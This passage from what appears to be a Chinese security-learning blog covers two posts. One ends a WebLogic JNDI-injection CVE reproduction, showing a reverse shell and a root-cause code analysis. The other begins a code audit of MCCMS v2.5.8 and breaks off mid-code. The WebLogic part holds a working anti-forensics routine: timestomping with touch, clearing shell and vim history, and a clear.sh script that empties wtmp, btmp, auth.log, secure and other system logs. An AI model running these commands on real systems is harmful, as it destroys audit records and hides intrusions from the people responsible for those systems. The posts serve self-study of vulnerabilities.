<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">touch</span> -t <span class="number">11270451</span> css</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201121843879.png"><img src="/CVE-Test/image-20231201121843879.png" alt="image-20231201121843879"></a></p>
<h4 id="删除weblogic服务日志"><a href="#删除weblogic服务日志" class="headerlink" title="删除weblogic服务日志"></a>删除weblogic服务日志</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/home/</span>ttoc<span class="regexp">/Oracle/</span>Middleware<span class="regexp">/Oracle_Home/u</span>ser_projects<span class="regexp">/domains/</span>base_domain<span class="regexp">/servers/</span>AdminServer/logs</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201124945937.png"><img src="/CVE-Test/image-20231201124945937.png" alt="image-20231201124945937"></a></p>
<p>主要是一些服务启动日志和访问情况日志，可以直接都删除，除了文件夹可以保留</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> *</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201125234934.png"><img src="/CVE-Test/image-20231201125234934.png" alt="image-20231201125234934"></a></p>
<p>然后将日志目录修改时间改一下，和其他一致</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201125315971.png"><img src="/CVE-Test/image-20231201125315971.png" alt="image-20231201125315971"></a></p>
<p>执行命令，</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">touch</span> -t <span class="number">11292033</span> ./</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201125405018.png"><img src="/CVE-Test/image-20231201125405018.png" alt="image-20231201125405018"></a></p>
<h4 id="删除系统日志"><a href="#删除系统日志" class="headerlink" title="删除系统日志"></a>删除系统日志</h4><p>文件时间修改完了就是删除命令历史记录以及日志文件，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">histroy -r          <span class="comment">#删除当前会话历史记录</span></span><br><span class="line"><span class="built_in">history</span> -c          <span class="comment">#删除内存中的所有命令历史</span></span><br><span class="line"><span class="built_in">rm</span> .bash_history   <span class="comment">#删除历史文件中的内容</span></span><br><span class="line">HISTZISE=0          <span class="comment">#通过设置历史命令条数来清除所有历史记录</span></span><br></pre></td></tr></table></figure>

<p>再使用vim打开，执行下面命令，</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> <span class="attribute">history</span>=0</span><br></pre></td></tr></table></figure>

<p>然后再删除日志文件</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">var</span>/<span class="keyword">run</span>/utmp 记录现在登入的用户</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/wtmp 记录用户所有的登入和登出</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/lastlog 记录每一个用户最后登入时间</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/btmp 记录错误的登入尝试</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/auth.<span class="keyword">log</span> 需要身份确认的操作</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/secure 记录安全相关的日志信息</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/maillog 记录邮件相关的日志信息</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/message 记录系统启动后的信息和错误日志</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/cron 记录定时任务相关的日志信息</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/spooler 记录UUCP和<span class="keyword">news</span>设备相关的日志信息</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/<span class="keyword">boot</span>.<span class="keyword">log</span> 记录守护进程启动和停止相关的日志消息</span><br></pre></td></tr></table></figure>

<p>最后汇总可以一个脚本解决问题，只是vim需要自己操作一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/syslog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/messages</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/access_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/error_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/xferlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/secure</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/auth.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/user.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/wtmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/lastlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/btmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/run/utmp</span><br><span class="line"><span class="built_in">rm</span> ~/.bash_history</span><br><span class="line"><span class="built_in">history</span> -c</span><br></pre></td></tr></table></figure>

<p>首先来到用户目录~，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201122459733.png"><img src="/CVE-Test/image-20231201122459733.png" alt="image-20231201122459733"></a></p>
<p>生成清除痕迹脚本文件，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201124049869.png"><img src="/CVE-Test/image-20231201124049869.png" alt="image-20231201124049869"></a></p>
<p>然后赋执行权限，</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">chmod 777 <span class="keyword">clear</span>.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201124410575.png"><img src="/CVE-Test/image-20231201124410575.png" alt="image-20231201124410575"></a></p>
<p>然后清空vim记录，</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> <span class="attribute">history</span>=0</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201123307378.png"><img src="/CVE-Test/image-20231201123307378.png" alt="image-20231201123307378"></a></p>
<p>最后删掉.viminfo ，其中有大量当前用户执行的用vim生成的文档日志</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201123614967.png"><img src="/CVE-Test/image-20231201123614967.png" alt="image-20231201123614967"></a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> .viminfo</span><br></pre></td></tr></table></figure>

<p>最后再次执行脚本清空系统日志和命令执行历史，因为是weblogic服务，所以没有用httpd，所以没有日志。</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">./<span class="keyword">clear</span>.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201122754841.png"><img src="/CVE-Test/image-20231201122754841.png" alt="image-20231201122754841"></a></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201125647334.png"><img src="/CVE-Test/image-20231201125647334.png" alt="image-20231201125647334"></a></p>
<p>最后一步删除clear.sh，再修改时间，即可</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">rm</span> <span class="keyword">clear</span>.<span class="keyword">sh</span>;touch -t 11270436 ./ </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201125831451.png"><img src="/CVE-Test/image-20231201125831451.png" alt="image-20231201125831451"></a></p>
<p>痕迹清理完成，渗透完毕</p>
<h3 id="附加用java工具"><a href="#附加用java工具" class="headerlink" title="附加用java工具"></a>附加用java工具</h3><p>在java17环境下运行脚本发生问题，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201213653846.png"><img src="/CVE-Test/image-20231201213653846.png" alt="image-20231201213653846"></a></p>
<p>这个错误是由于Java 9中已经弃用了java.corba模块（例如，org.omg.CORBA*包），而在Java 11中，该模块已经不再可用。弃用模块意味着默认情况下，模块中的类在类路径中不可用。</p>
<p>对于Java 9和10，你需要在命令行中包含<code>--add-module java.corba</code>选项以将它们添加到类路径。但是，这个选项在Java 11中不可用。</p>
<p>所以对于Java 11以及之后的版本，需要从在线资源中下载GlassFish CORBA JAR文件，并将它们添加到Java 11的类路径，</p>
<ul>
<li>glassfish-corba-omgapi.jar</li>
<li>glassfish-corba-orb.jar</li>
<li>glassfish-corba-internal-api.jar</li>
<li>pfl-basic.jar</li>
<li>pfl-tf.jar</li>
</ul>
<p>当然最简单的就是切换工具所在java环境降低版本，于是我将主机的java环境降低为<code>jdk1.8.0_171</code></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201213957613.png"><img src="/CVE-Test/image-20231201213957613.png" alt="image-20231201213957613"></a></p>
<p>就可以成功执行，并成功反弹shell</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201214138728.png"><img src="/CVE-Test/image-20231201214138728.png" alt="image-20231201214138728"></a></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201214155986.png"><img src="/CVE-Test/image-20231201214155986.png" alt="image-20231201214155986"></a></p>
<h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>该漏洞的形成由于Weblogic IIOP&#x2F;T3协议存在缺陷，当IIOP&#x2F;T3协议开启时，允许未经身份验证的攻击者通过IIOP&#x2F;T3协议网络访问攻击存在安全风险的WebLogic Server，漏洞利用成功<code>WebLogic Server</code>可能被攻击者接管执行任意命令导致服务器沦陷或者造成严重的敏感数据泄露。</p>
<p>而t3&#x2F;iiop协议支持远程绑定对象bind到服务端，并且可以通过<code>lookup</code>查看，当远程对象继承自<code>OpaqueReference</code>时，<code>lookup</code>查看远程对象，服务端会调用远程对象<code>getReferent</code>方法。<code>weblogic.deployment.jms.ForeignOpaqueReference</code>继承自<code>OpaqueReference</code>并且实现了<code>getReferent</code>方法，并且存在<code>retVal = context.lookup(this.remoteJNDIName)</code>实现，故可以通过<code>rmi/ldap</code>远程协议进行远程命令执行。</p>
<p>t3&#x2F;iiop协议支持远程绑定对象bind到服务端，并且可以通过lookup查看，当远程对象继承自OpaqueReference时，lookup查看远程对象，服务端会调用远程对象getReferent方法。</p>
<p>所以其本质还是jndi注入，控制lookup函数的参数，这样来使客户端访问恶意的RMI或者LDAP服务来加载恶意的对象，从而执行代码。在JNDI服务中，通过绑定一个外部远程对象让客户端请求，从而使客户端恶意代码执行的方式就是利用Reference类实现的。Reference类表示对存在于命名&#x2F;目录系统以外的对象的引用。具体则是指如果远程获取RMI服务器上的对象为Reference类或者其子类时，则可以从其他服务器上加载class字节码文件来实例化。</p>
<h2 id="漏洞点代码分析"><a href="#漏洞点代码分析" class="headerlink" title="漏洞点代码分析"></a>漏洞点代码分析</h2><p>该漏洞的形成主要原因是<code>ForeignOpaqueReference</code>类的问题于是查看这个类代码跟进分析，打开<code>com.oracle.weblogic.deployment.jar</code>包查看，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231204203947464.png"><img src="/CVE-Test/image-20231204203947464.png" alt="image-20231204203947464"></a></p>
<p><code>ForeignOpaqueReference</code>类的<code>getReferent()</code>方法是造成这个漏洞的主要原因，该方法是<code>OpaqueReference</code>接口的实现方法，在<code>getReferent()</code>方法中，<code>retVal = context.lookup(this.remoteJNDIName);</code> 对本类<code>remoteJNDIName</code>变量中的<code>JNDI</code>地址进行远程加载，导致了反序列化漏洞。</p>
<p>但是实际上，反序列化过程中没有进行恶意操作,在完成反序列化过程后执行了漏洞类<code>ForeignOpaqueReference</code>中<code>getReferent()</code>方法中的<code>lookup()</code>才触发的漏洞。</p>
<p>分析该方法代码，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231204203928772.png"><img src="/CVE-Test/image-20231204203928772.png" alt="image-20231204203928772"></a></p>
<p>发现在该方法中利用了<code>lookup</code>方法，但是发现其对<code>remoteJNDIName</code>用方法<code>evalMarocs</code>进行了过滤，所以这里很有可能就是漏洞点限制方法不完全导致这里可以进行<code>jndi</code>注入。</p>
<p>再查找何处调用了<code>getReferent</code>方法，如何向这个方法传参，可以先看看<code>remoteJNDIName</code>和<code>jndiEnvironment</code>参数的定义和传递，这两个参数都是<code>ForeignOpaqueReference</code>类定义的私有变量。</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231204203913643.png"><img src="/CVE-Test/image-20231204203913643.png" alt="image-20231204203913643"></a></p>
<p>这两个变量的主要作用是在进行<code>lookup</code>操作之前，用于检查 JNDI 环境是否已正确配置以访问远程资源。 </p>
<p>继续分析图16中代码，发现其中只需要让一个条件为真，即可调用<code>retVal = context.lookup(evalMacros(this.remoteJNDIName))</code>，而所有条件为假才会开始检测<code>cachedReferent</code>。</p>
<p>分析条件语句，<code>if (this.jndiEnvironment == null || !AQJMS_ICF.equals(this.jndiEnvironment.get(&quot;java.naming.factory.initial&quot;)) || this.remoteJNDIName == null || !this.remoteJNDIName.startsWith(AQJMS_QPREFIX) &amp;&amp; !this.remoteJNDIName.startsWith(AQJMS_TPREFIX))</code>，如果要条件为真只有以下几种情况：</p>
<blockquote>
<ul>
<li><p>条件1 <code>(this.jndiEnvironment == null)</code>: 检查 <code>jndiEnvironment</code> 是否为 <code>null</code>。如果 <code>jndiEnvironment</code> 为 <code>null</code>，条件为真。</p>
</li>
<li><p>条件2 <code>(!AQJMS_ICF.equals(this.jndiEnvironment.get(&quot;java.naming.factory.initial&quot;)))</code>: 检查 <code>jndiEnvironment</code> 中的 “<code>java.naming.factory.initial</code>“ 属性是否不等于预定义的值 <code>AQJMS_ICF</code>。如果不等于，条件为真。</p>
</li>
<li><p>条件3 <code>(this.remoteJNDIName == null)</code>: 检查 <code>remoteJNDIName</code> 是否为 <code>null</code>。如果 <code>remoteJNDIName</code> 为 null，条件为真。</p>
</li>
<li><p>条件4 <code>(!this.remoteJNDIName.startsWith(AQJMS_QPREFIX))</code>: 检查 <code>remoteJNDIName</code> 是否不以预定义的值 <code>AQJMS_QPREFIX</code> 开头。如果不以该前缀开头，条件为真。</p>
</li>
<li><p>条件5 <code>(!this.remoteJNDIName.startsWith(AQJMS_TPREFIX))</code>: 检查 <code>remoteJNDIName</code> 是否不以预定义的值 <code>AQJMS_TPREFIX</code> 开头。如果不以该前缀开头，条件为真。</p>
</li>
</ul>
</blockquote>
<p>开始本来想让<code>jndiEnvironment</code>直接为空，这样条件语句就成立了， 但是却无法对<code>InitialContext</code>进行赋值初始化，而<code>remoteJNDIName</code>为空也不可以，因为它是<code>JNDI</code>注入的关键参数。所以只要<code>!AQJMS_ICF.equals(this.jndiEnvironment.get(&quot;java.naming.factory.initial&quot;))</code>或者<code>!this.remoteJNDIName.startsWith(AQJMS_QPREFIX) &amp;&amp; !this.remoteJNDIName.startsWith(AQJMS_TPREFIX))</code>满足即可。</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/a.png"><img src="/CVE-Test/a.png" alt="a"></a></p>
<p>而<code>jndiEnvironment</code>和<code>remoteJNDIName</code>的值都可以通过反射赋值控制，再通过<code>retVal = context.lookup(evalMacros(this.remoteJNDIName))</code>执行，便可以利用<code>rmi/ldap</code>远程协议进行命令执行。</p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞测试</title>
    <url>/CMS-Test/</url>
    <content><![CDATA[<p><code>训练一下自己的代码审计能力，了解一些开源框架的漏洞形成原因，并自己尝试复现</code></p>
<span id="more"></span>

<h1 id="漫城CMS-v2-5-8漏洞分析"><a href="#漫城CMS-v2-5-8漏洞分析" class="headerlink" title="漫城CMS v2.5.8漏洞分析"></a>漫城CMS v2.5.8漏洞分析</h1><blockquote>
<p>免费看漫画(</p>
</blockquote>
<h2 id="环境搭建phpstudy"><a href="#环境搭建phpstudy" class="headerlink" title="环境搭建phpstudy"></a>环境搭建<code>phpstudy</code></h2><blockquote>
<p>Apache 2.4.43<br>MySQL 8.0.12<br>php 7.3.4</p>
</blockquote>
<h3 id="管理员页面"><a href="#管理员页面" class="headerlink" title="管理员页面"></a>管理员页面</h3><p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122144520325.png"><img src="/CMS-Test/image-20221122144520325.png" alt="image-20221122144520325"></a></p>
<h3 id="主页"><a href="#主页" class="headerlink" title="主页"></a>主页</h3><p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122144602259.png"><img src="/CMS-Test/image-20221122144602259.png" alt="image-20221122144602259"></a></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="官方文档信息"><a href="#官方文档信息" class="headerlink" title="官方文档信息"></a>官方文档信息</h3><p>整体目录结构</p>
<p>如下（大致猜测漏洞出现位置）：</p>
<blockquote>
<p>  │─attachment &#x2F;&#x2F;附件目录<br>  │─caches  &#x2F;&#x2F;缓存目录<br>  │─packs &#x2F;&#x2F;静态文件目录<br>  │─rewrite &#x2F;&#x2F;伪静态文件目录<br>  │─sys &#x2F;&#x2F;系统核心目录<br>  │  │─apps &#x2F;&#x2F;应用目录<br>  │  │─class &#x2F;&#x2F;第三方库类目录【可能存在】<br>  │  │─errors &#x2F;&#x2F;系统错误提示目录<br>  │  │─libs &#x2F;&#x2F;系统常量配置目录<br>  │  │─system &#x2F;&#x2F;CI框架目录<br>  │─template &#x2F;&#x2F;模板目录【可能存在】<br>  │  │─admin &#x2F;&#x2F;后台模板<br>  │  │─install &#x2F;&#x2F;系统安装模板<br>  │  │─pc &#x2F;&#x2F;前台PC端模版<br>  │  │─wap &#x2F;&#x2F;前台手机模版<br>  │─admin.php &#x2F;&#x2F;后台入口文件（为了安全起见，请修改文件名）【可能存在】<br>  └─index.php &#x2F;&#x2F;入口文件【可能存在】</p>
</blockquote>
<h3 id="模板目录结构"><a href="#模板目录结构" class="headerlink" title="模板目录结构"></a>模板目录结构</h3><p>系统模板系统放在&#x2F;template&#x2F;目录下。在后台站点设置中，可以选择当前使用的模板</p>
<blockquote>
<p>│─template&#x2F;[pc&#x2F;wap]&#x2F;1&#x2F; 模板1<br>│ ├─js js文件<br>│ ├─css css文件<br>│ ├─images 图片文件<br>│ ├─html 模板文件目录（该目录名可以随意修改，注意tpl.php也有需要同时修改）<br>│ │  │─custom 自定义模板目录<br>│ │  │─author 作者中心目录<br>│ │  │  │─packs.html 样式模版<br>│ │  │  │─head.html 模板头部文件<br>│ │  │  │─bottom.html 模板底部文件<br>│ │  │  │─left.html 模板左部文件<br>│ │  │  │─right.html 模板右部文件<br>│ │  │  │─chapter.html 章节列表模版<br>│ │  │  │─chapter_add.html 新增章节模版<br>│ │  │  │─chapter_edit.html 修改章节模版<br>│ │  │  │─comic.html 漫画列表模版<br>│ │  │  │─comic_add.html 新增漫画模版<br>│ │  │  │─comic_info.html 漫画详情模版<br>│ │  │  │─comment.html 读者评论模版<br>│ │  │  │─drawing.html 提现记录模版<br>│ │  │  │─drawing_add.html 申请提现模版<br>│ │  │  │─home.html 作者主页模版<br>│ │  │  │─income.html 分成记录模版<br>│ │  │  │─index.html 作者中心主页模版<br>│ │  │  │─renzheng.html 作者认证模版<br>│ │  │─user 读者中心目录<br>│ │  │  │─packs.html 样式模版<br>│ │  │  │─head.html 模板头部文件<br>│ │  │  │─bottom.html 模板底部文件<br>│ │  │  │─left.html 模板左部文件<br>│ │  │  │─right.html 模板右部文件<br>│ │  │  │─index.html 读者中心主页模版<br>│ │  │  │─bind.html 第三方账号绑定模版<br>│ │  │  │─buy.html 消费记录模版<br>│ │  │  │─comic.html 漫画购买记录模版<br>│ │  │  │─comment.html 评论记录模版<br>│ │  │  │─fav.html 漫画收藏记录模版<br>│ │  │  │─info.html 资料修改模版<br>│ │  │  │─info_pass.html 密码修改模版<br>│ │  │  │─message.html 消息列表模版<br>│ │  │  │─order.html 充值订单记录模版<br>│ │  │  │─read.html 阅读记录模版<br>│ │  │  │─ticket.html 月票消费记录模版<br>│ │  │  │─pay.html 充值中心模版<br>│ │  │  │─pay_cion.html 虚拟币充值模版<br>│ │  │  │─pay_ticket.html 购买月票模版<br>│ │  │  │─pay_vip.html 充值VIP模版<br>│ │  │  │─reg.html 用户注册模版<br>│ │  │  │─login.html 用户登陆模版<br>│ │  │  │─pass.html 找回密码模版<br>│ │  │─packs.html 样式模版<br>│ │  │─head.html 模板头部文件<br>│ │  │─bottom.html 模板底部文件<br>│ │  │─left.html 模板左部文件<br>│ │  │─right.html 模板右部文件<br>│ │  │─category.html 漫画检索模版<br>│ │  │─chapter.html 漫画阅读模版<br>│ │  │─comic.html 漫画详情模版<br>│ │  │─comment.html 漫画评论模版<br>│ │  │─error.html 错误提示模版<br>│ │  │─index.html 主页模版<br>│ │  │─lists.html 分类页模版<br>│ │  │─search.html 漫画搜索模版<br>│ ├─pic.png 模板演示图片文件<br>│ ├─tpl.php 模板信息文件<br>│─tempalte&#x2F;[pc&#x2F;wap]&#x2F;2&#x2F; 模板2<br>│─…<br>│─template&#x2F;[pc&#x2F;wap]&#x2F;n&#x2F; 模板N</p>
</blockquote>
<h3 id="版本更新文档"><a href="#版本更新文档" class="headerlink" title="版本更新文档"></a>版本更新文档</h3><p>当我们在后台页面时，会弹出更新提醒，在这提醒中我们大致得到了几个已知漏洞的存在</p>
<blockquote>
<p>当前环境mccms v2.5.8</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122212640814.png"><img src="/CMS-Test/image-20221122212640814.png" alt="image-20221122212640814"></a></p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122211650800.png"><img src="/CMS-Test/image-20221122211650800.png" alt="image-20221122211650800"></a></p>
<p>在官方提示更新的文档中，我们得到消息</p>
<p>在当前<code>v2.5.8</code>版本中，存在至少4个漏洞</p>
<blockquote>
<p>1.修复了充值月票逻辑缺陷<br>2.修复了作家发布漫画小说命令执行漏洞<br>3.修复了SQL注入漏洞<br>4.修复了后台一处安全漏洞</p>
</blockquote>
<h2 id="CMS已被找到的公开漏洞信息"><a href="#CMS已被找到的公开漏洞信息" class="headerlink" title="CMS已被找到的公开漏洞信息"></a><code>CMS</code>已被找到的公开漏洞信息</h2><p><code>CNVD-2021-51411</code>【危害低】</p>
<table>
<thead>
<tr>
<th>公开时间2021-08-18</th>
<th>报送时间2021-07-06</th>
</tr>
</thead>
<tbody><tr>
<td>收录时间2021-07-16</td>
<td>更新时间2021-07-16</td>
</tr>
<tr>
<td><code>CVSS 2.0--</code></td>
<td></td>
</tr>
<tr>
<td><code>CVSS 3.X--</code></td>
<td></td>
</tr>
<tr>
<td>影响产品桂林崇胜网络科技有限公司 漫城<code>CMS v2.5.2</code></td>
<td></td>
</tr>
</tbody></table>
<p><code>CNVD-2021-48907</code>【危害高】</p>
<table>
<thead>
<tr>
<th>公开时间2021-08-12</th>
<th>报送时间2021-06-28</th>
</tr>
</thead>
<tbody><tr>
<td>收录时间2021-07-09</td>
<td>更新时间2021-07-09</td>
</tr>
<tr>
<td><code>CVSS 2.0--</code></td>
<td></td>
</tr>
<tr>
<td><code>CVSS 3.X--</code></td>
<td></td>
</tr>
<tr>
<td>影响产品桂林崇胜网络科技有限公司 漫城<code>CMS v2.5.2</code></td>
<td></td>
</tr>
</tbody></table>
<blockquote>
<p>CNVD-2021-51867</p>
<p>中危 Mccms存在任意文件下载漏洞</p>
<p>桂林崇胜网络科技有限公司 Mccms v2.5.2</p>
<p>2021-08-18</p>
</blockquote>
<blockquote>
<p>CNVD-2021-51492</p>
<p>中危 Mccms存在文件上传漏洞</p>
<p>桂林崇胜网络科技有限公司 Mccms v2.5.2</p>
<p>2021-08-18</p>
</blockquote>
<blockquote>
<p>CNVD-2021-51860</p>
<p>中危 Mccms存在逻辑缺陷漏洞</p>
<p>桂林崇胜网络科技有限公司 Mccms v2.5.2</p>
<p>2021-08-18</p>
</blockquote>
<h2 id="批量代码审计"><a href="#批量代码审计" class="headerlink" title="批量代码审计"></a>批量代码审计</h2><p><code>Seay</code>代码审计</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122165423902.png"><img src="/CMS-Test/image-20221122165423902.png" alt="image-20221122165423902"></a></p>
<p>由我们对更新文档中的信息以及目录结构猜测这些漏洞大概出现在哪些代码处</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="1-充值月票逻辑缺陷"><a href="#1-充值月票逻辑缺陷" class="headerlink" title="1.充值月票逻辑缺陷"></a>1.充值月票逻辑缺陷</h3><blockquote>
<p>充值月票逻辑缺陷<br>猜测为支付漏洞<br>常见大致有4种，修改单价，修改总价，修改购买数量，以及重复发包导致以少量的钱实现多次购买</p>
</blockquote>
<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>查看支付代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#sys/apps/controllers/api/Pay.php </span></span><br><span class="line">  <span class="comment">//金币</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;cion&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">10</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">10</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">20</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">20</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">30</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">30</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">50</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">50</span>),</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//VIP</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;vip&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">30</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb1,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;月度VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;有效期30天&#x27;</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">90</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb2,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;季度VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;有效期90天&#x27;</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">180</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb3,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;半年VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;有效期180天&#x27;</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">365</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb4,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;年度VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;有效期365天&#x27;</span>),</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//月票</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;ticket&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;num&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">1</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;num&#x27;</span>=&gt;<span class="number">5</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">5</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">5</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;num&#x27;</span>=&gt;<span class="number">10</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">10</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">10</span>),</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"><span class="comment">/*上面三个数组实现了rmb，金币，月票，vip之间的兑换率*/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//支付方式</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;is_wxpay&#x27;</span>] = Pay_Wx_Mode;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;is_alipay&#x27;</span>] = 